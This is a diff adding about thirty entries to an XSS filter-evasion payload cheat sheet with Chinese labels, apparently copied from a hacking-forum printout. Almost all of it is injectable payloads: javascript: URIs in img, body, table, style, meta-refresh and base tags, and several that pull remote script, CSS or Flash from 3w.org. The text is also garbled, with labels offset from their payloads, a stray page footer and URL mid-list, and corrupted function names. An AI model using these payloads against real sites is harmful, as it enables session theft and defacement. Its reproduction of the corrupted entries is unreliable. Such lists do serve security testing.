@@ -34,6 +34,110 @@ Content in the first column | Content in the second column
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 (7)formCharCode标签(计算器)
 
+<SCRIPT SRC=//3w.org/XSS/xss.js>
+(26)半开的HTML/JavaScript XSS
+
+<IMG SRC="javascript:alert('XSS')"
+(27)双开角括号
+
+<iframe src=http://3w.org/XSS.html <
+(28)无单引号 双引号 分号
+
+<SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+(29)换码过滤的JavaScript
+
+\";alert('XSS');//
+(30)结束Title标签
+
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+(31)Input Image
+
+<INPUT SRC="javascript:alert('XSS');">
+(32)BODY Image
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+(33)BODY标签
+
+<BODY('XSS')>
+(34)IMG Dynsrc
+
+<IMG DYNSRC="javascript:alert('XSS')">
+(35)IMG Lowsrc
+
+<IMG LOWSRC="javascript:alert('XSS')">
+(36)BGSOUND
+
+<BGSOUND SRC="javascript:alert('XSS');">
+(37)STYLE sheet
+
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+(38)远程样式表
+
+<LINK REL="stylesheet" HREF="http://3w.org/xss.css">
+(39)List-style-image(列表式)
+
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+(40)IMG VBscript
+
+<IMG SRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS
+(41)META链接url
+
+<META HTTP-EQUIV="refresh" CONTENT="0;
+URL=http://;URL=javascript:alert('XSS');">
+(42)Iframe
+
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+(43)Frame
+
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>12-7-1 T00LS - Powered by Discuz! Board
+https://www.a.com/viewthread.php?action=printable&tid=15267 3/6
+(44)Table
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
+(45)TD
+
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+(46)DIV background-image
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+(47)DIV background-image后加上额外字符(1-32&34&39&160&8192-
+8&13&12288&65279)
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+(48)DIV expression
+
+<DIV STYLE="width: expression_r(alert('XSS'));">
+(49)STYLE属性分拆表达
+
+<IMG STYLE="xss:expression_r(alert('XSS'))">
+(50)匿名STYLE(组成:开角号和一个字母开头)
+
+<XSS STYLE="xss:expression_r(alert('XSS'))">
+(51)STYLE background-image
+
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A
+CLASS=XSS></A>
+(52)IMG STYLE方式
+
+exppression(alert("XSS"))'>
+(53)STYLE background
+
+<STYLE><STYLE
+type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+(54)BASE
+
+<BASE HREF="javascript:alert('XSS');//">
+(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
+
+<EMBED SRC="http://3w.org/XSS/xss.swf" ></EMBED>
+(56)在flash中使用ActionScrpt可以混进你XSS的代码
+
+a="get";
+b="URL(\"";
+c="javascript:";
+d="alert('XSS');\")";
+eval_r(a+b+c+d);
 (57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
 
 <HTML xmlns:xss>
